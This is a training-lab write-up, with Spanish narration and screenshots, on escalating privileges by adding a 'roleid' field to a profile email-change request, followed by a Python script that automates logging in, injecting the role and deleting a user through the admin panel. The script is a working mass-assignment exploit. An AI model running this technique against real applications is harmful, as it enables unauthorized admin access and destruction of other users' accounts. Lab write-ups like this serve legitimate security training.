# Lab: User role can be modified in user profile

This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

---


Una vez que iniciamos sesión con nuestro usuario, nos dirigimos al recurso `/admin` y recibimos la siguiente respuesta:
![image](https://github.com/user-attachments/assets/c0e85c3d-1a2f-4bba-b11b-eac739d3b3b6)

Inspeccionamos todas las funcionalidades en búsqueda de transacción de parámetros y, eventualmente la posibilidad de inyección del parámetro `roleid`.
En el endpoint `/my-account` manejamos parámetros cuando solicitamos con un GET
![image](https://github.com/user-attachments/assets/ca14b5df-010c-4cf3-ac20-ba643df1ec3b)

Cuando solicitamos la funcionalidad de cambio de email vemos lo siguiente:
![image](https://github.com/user-attachments/assets/94860afc-cac9-43f8-9674-dc8627e99265)
Intentamos inyectar el parámetro `roleid=2`:
![image](https://github.com/user-attachments/assets/87003534-c57a-4444-9ced-24614c319485)

Solicitamos con éxito el recurso `/admin`:
![image](https://github.com/user-attachments/assets/d4c830bf-1c34-49cf-bed3-85784c52a03c)

Eliminamos al usuario carlos y resolvemos el laboratorio:
![image](https://github.com/user-attachments/assets/2009d6c5-2da0-4089-9007-af74f9e65b51)

![image](https://github.com/user-attachments/assets/4585b6be-f4f1-497d-aa66-f62d09be83f1)

---

We can also perform the following python script to resolve the lab:
```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(s, url):

    # login as the wiener user
    login_url = url + "/login"
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user.")

        # Change the role id of the user
        change_email_url = url + "/my-account/change-email"
        data_role_change = {"email":"test@test.ca", "roleid": 2}
        r = s.post(change_email_url, json=data_role_change, verify=False, proxies=proxies)
        res = r.text
        if 'Admin' in res:
            print("(+) Successfully changed the role id.")

            # Delete the Carlos user
            delete_carlos_user_url = url + "/admin/delete?username=carlos"
            r = s.get(delete_carlos_user_url, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("(+) Successfully delete Carlos user.")
            else:
                print("(-) Could not delete Carlos user.")
                sys.exit(-1)
        else:
            print("(-) Could not change the role id.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)



def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)


    

if __name__ == "__main__":
    main()
```
